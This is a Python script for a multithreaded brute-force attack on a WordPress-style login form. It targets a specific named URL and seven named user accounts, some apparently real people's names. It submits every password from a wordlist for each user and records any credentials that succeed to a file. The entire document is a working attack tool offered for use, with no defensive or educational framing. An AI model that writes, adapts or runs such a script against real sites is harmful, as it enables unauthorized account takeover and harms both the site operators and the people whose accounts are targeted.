import requests
from queue import Queue
from threading import Thread
import time

# Target WordPress login URL
target_url = 'https://log-in-ecru.vercel.app/'

# Import list of passwords
with open('pass.txt', 'r') as file:
    passwords = [line.strip() for line in file]

# Users to target
users = ['adminx', 'fahrul', 'widatarigan', 'yoshua', 'rafidhah', 'wida Tarigan', 'donie']

# Queue for passwords
q = Queue()

# Function to perform bruteforce attack
def bruteforce(username, password):
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': 'https://log-in-ecru.vercel.app/',
        'testcookie': '1'
    }
    response = requests.post(target_url, data=data, allow_redirects=True)
    if 'wp-admin' in response.url:
        print(f'Success! Username: {username}, Password: {password}')
        with open('successful_logins.txt', 'a') as f:
            f.write(f'Username: {username}, Password: {password}\n')
    else:
        print(f'Failed: {username}, {password}')

# Function to run threads
def threader():
    while True:
        username, password = q.get()
        if username is None:
            break
        bruteforce(username, password)
        q.task_done()

# Fill the queue with passwords and users
for username in users:
    for password in passwords:
        q.put((username, password))

# Start threads
num_threads = 10
threads = []
for i in range(num_threads):
    t = Thread(target=threader)
    t.daemon = True
    t.start()
    threads.append(t)

# Wait until the queue is fully processed
q.join()

# Stop threads
for i in range(num_threads):
    q.put((None, None))
for t in threads:
    t.join()

print("Bruteforce attack completed.")
  
